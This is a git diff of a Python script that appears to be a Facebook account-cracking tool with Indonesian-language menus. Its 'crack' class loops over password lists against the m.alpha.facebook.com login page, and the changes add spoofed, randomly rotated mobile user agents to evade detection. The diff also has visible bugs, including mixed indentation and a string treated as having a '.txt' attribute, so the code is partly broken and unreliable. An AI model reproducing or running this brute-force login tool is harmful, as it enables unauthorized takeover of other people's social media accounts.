@@ -5,7 +5,11 @@ from rich import print
 from concurrent.futures import ThreadPoolExecutor
 from rich.tree import Tree
 from rich.console import Console
-
+try:ugen = open('user.txt','r').read().splitlines()
+except:ugen = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
+try:ugen2 = open('user2.txt','r').read().splitlines()
+except:ugen2 = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
+	
 ### LIST DUMP ###
 Dump = []
 ### BANNER OR LOGO ###
@@ -286,7 +290,9 @@ class crack:
     def main(self, total, email, password):
         try:
             for pws in password:
-                self.useragent = self.realme_useragent(total = 1)
+		ua = random.choice(ugen)
+		ua2 = random.choice(ugen2)
+                #self.useragent = self.realme_useragent(total = 1)
                 with requests.Session() as r:
                     r.headers.update({
                         'connection': 'keep-alive',
@@ -299,7 +305,7 @@ class crack:
                         'sec-fetch-user': '?1',
                         'upgrade-insecure-requests': '1',
                         'host': 'm.alpha.facebook.com',
-                        'user-agent': self.useragent
+                        'user-agent': ua.txt
                     })
                     response = r.get('https://m.alpha.facebook.com/login.php?').text
                     try:
@@ -407,7 +413,7 @@ def uas(__Aang__Sayang__Laura__):
 			ua_ = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
 			open("ua.txt","w").write(ua_);time.sleep(2)
 			print ("\n[✓]  Berhasil menggunakan user agent script ");time.sleep(2)
-			pilihan().daftar_menu()
+			daftar_menu()
 		open("ua.txt","w").write(ua);time.sleep(2)
 		print ("\n[✓] Berhasil mengganti user agent");time.sleep(2)
 		daftar_menu()
@@ -418,11 +424,11 @@ def uas(__Aang__Sayang__Laura__):
 			input('\n[!] Tekan enter ')
 			daftar_menu()
 		except IOError:
-			print()
+			print('error')
 	elif __Aang__Sayang__Laura__ in("0","00"):
 		daftar_menu()
 	else:
-		print ('\n[!] Yang bener kontol');time.sleep(2)
+		print ('\n[!] Yang bener bang');time.sleep(2)
 		uas(__Aang__Sayang__Laura__)
 		
 if __name__ == '__main__':
